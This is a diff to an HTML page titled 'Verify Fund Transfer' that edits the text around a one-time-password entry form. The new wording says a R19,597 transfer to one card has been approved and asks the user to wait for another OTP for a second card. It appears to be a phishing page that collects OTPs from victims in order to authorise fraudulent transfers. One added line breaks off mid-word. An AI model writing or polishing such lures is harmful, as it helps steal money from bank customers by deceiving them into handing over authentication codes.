@@ -64,7 +64,8 @@
     <!-- OTP Input Form -->
     <div id="otpForm">
         <h2>Verify Fund Transfer</h2>
-        <p>To complete the transfer of <strong>R19,597</strong> with a transaction fee of <strong>R369.00</strong>, please enter the OTP sent to your mobile.</p>
+        <p>Your fund transfer of <strong>R19,597</strong> with a transaction fee of <strong>R369.00</strong> has been approved to the card ending in <strong>48911</strong>.</p>
+        <p>Please await your next OTP for the card ending with <strong>48903</strong>.</p>
         <input type="text" id="otpInput" placeholder="Enter OTP" required>
         <button onclick="validateOTP()">Validate OTP</button>
     </div>
@@ -72,7 +73,7 @@
     <!-- OTP Expired Message -->
     <div id="otpExpiredMessage" style="display: none;">
         <h2>OTP Expired</h2>
-        <p>Your OTP has expired. Please request a new OTP to continue with the fund transfer of <strong>R19,597</strong> plus a <strong>R369.00</strong> transaction fee.</p>
+        <p>Your funds transfer of <strong>R19,597</strong> with a transaction fee of <strong>R369.00</strong> has been appr.</p>
         <a href="#" class="retry-button" onclick="requestNewOTP()">Request New OTP</a>
     </div>
 </div>
